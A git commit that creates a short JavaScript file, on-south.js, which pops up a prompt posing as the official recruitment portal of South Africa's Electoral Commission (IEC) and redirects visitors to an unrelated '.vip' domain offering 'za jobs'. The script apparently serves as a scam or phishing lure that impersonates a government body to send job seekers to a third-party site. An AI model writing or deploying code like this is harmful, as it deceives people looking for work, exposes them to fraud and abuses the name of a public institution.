d5444b9b2aa7f7004c2399a48e4ecfd389cf0a6b
akamufokr <resale-muffler51@icloud.com>
2026-09-24 10:09:25 +0100

    Create on-south.js

---
+++ on-south.js
@@ -0,0 +1,5 @@
+var password = 'IEC Recruitment'
+password=prompt('SMS: Welcome to the Official Electoral Commission of South Africa (IEC) Recruitment Portal, press OK to Proceed','IEC Recruitment');
+if (password != 'IEC Recruitment') {
+location.href='https://www.akamufokr.vip/apply-za-jobs';
+}
